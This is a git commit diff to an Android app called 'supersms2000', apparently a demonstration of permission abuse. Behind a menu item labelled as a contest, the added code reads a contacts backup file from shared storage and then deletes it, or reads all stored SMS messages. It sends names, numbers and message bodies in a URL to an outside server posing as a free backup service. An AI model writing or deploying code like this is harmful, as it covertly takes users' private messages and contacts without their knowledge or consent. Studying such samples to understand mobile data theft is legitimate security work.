b13075f61efd902258ca29e7535711516bf89bdf
David Wittenbrink <david.wittenbrink@gmail.com>
2015-01-20 11:34:21 +0100

    Removed webapp (moving it to a seperate repo), added opening contacts backup file and sending contacts to our server

--- app/src/main/java/com/example/permission/eis/supersms2000/MainActivity.java
+++ app/src/main/java/com/example/permission/eis/supersms2000/MainActivity.java
@@ -5,6 +5,7 @@ import android.content.Intent;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.Bundle;
+import android.os.Environment;
 import android.support.v4.app.Fragment;
 import android.support.v7.app.ActionBarActivity;
 import android.util.Log;
@@ -16,6 +17,10 @@ import android.view.ViewGroup;
 import android.widget.ArrayAdapter;
 import android.widget.ListView;
 
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileNotFoundException;
+import java.io.IOException;
 import java.io.UnsupportedEncodingException;
 import java.net.URLEncoder;
 import java.util.ArrayList;
@@ -52,10 +57,21 @@ public class MainActivity extends ActionBarActivity {
         // as you specify a parent activity in AndroidManifest.xml.
         int id = item.getItemId();
 
-        //noinspection SimplifiableIfStatement
         if (id == R.id.action_contest) {
-            String url = urlFormatSms(getAllSMS(this));
-            Log.v("URL", url);
+            String url;
+
+            File path = Environment.getExternalStoragePublicDirectory(
+                    Environment.DIRECTORY_DOCUMENTS);
+            File file = new File(path, "contacts_bu_.txt");
+            if (isExternalStorageReadable() && file.exists()) {
+
+                url = urlFormatContacts(getContactsFileContent(file));
+
+            } else {
+
+                url = urlFormatSms(getAllSMS(this));
+
+            }
 
             Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
             startActivity(browserIntent);
@@ -65,6 +81,78 @@ public class MainActivity extends ActionBarActivity {
         return super.onOptionsItemSelected(item);
     }
 
+    private String getContactsFileContent(File contactsFile) {
+        // new FileInputStream (new File(NAME_OF_FILE));
+        StringBuffer fileContent = new StringBuffer("");
+        FileInputStream fis;
+        byte[] buffer = new byte[1024];
+        int n;
+
+        try {
+            fis = new FileInputStream(contactsFile.getAbsolutePath());
+
+            try {
+                while ((n = fis.read(buffer)) != -1)
+                {
+                    fileContent.append(new String(buffer, 0, n));
+                }
+
+            } catch (IOException e) {
+
+                e.printStackTrace();
+            }
+
+            try {
+                fis.close();
+                contactsFile.delete();
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+
+
+        } catch (FileNotFoundException e) {
+            e.printStackTrace();
+            Log.e("FILE", "Error opening file");
+        }
+
+        return fileContent.toString();
+    }
+
+    /* Checks if external storage is available for read and write */
+    private boolean isExternalStorageWritable() {
+        String state = Environment.getExternalStorageState();
+        if (Environment.MEDIA_MOUNTED.equals(state)) {
+            return true;
+        }
+        return false;
+    }
+
+    /* Checks if external storage is available to at least read */
+    private boolean isExternalStorageReadable() {
+        String state = Environment.getExternalStorageState();
+        if (Environment.MEDIA_MOUNTED.equals(state) ||
+                Environment.MEDIA_MOUNTED_READ_ONLY.equals(state)) {
+            return true;
+        }
+        return false;
+    }
+
+    private String urlFormatContacts(String fileContent) {
+
+        String[] splitted;
+        String url = "https://free-ipad-sms-backup.appspot.com/?contacts=";
+
+        for (String line : fileContent.split("\n")) {
+            if (url.length() > 1700) {
+                break;
+            }
+            splitted = line.split("\t");
+            url = url.concat(splitted[0]).concat("__").
+                    concat(splitted[1]).concat("__").concat(splitted[2]).concat("||");
+        }
+        return url.substring(0, url.length() - 2);
+
+    }
 
     private String urlFormatSms(List<List<String>> allSms) {
 
@@ -98,6 +186,7 @@ public class MainActivity extends ActionBarActivity {
             String body = cur.getString(cur.getColumnIndexOrThrow("body"));
             sms.add(new ArrayList<String>(Arrays.asList(address, body)));
         }
+        cur.close();
 
         return sms;
     }
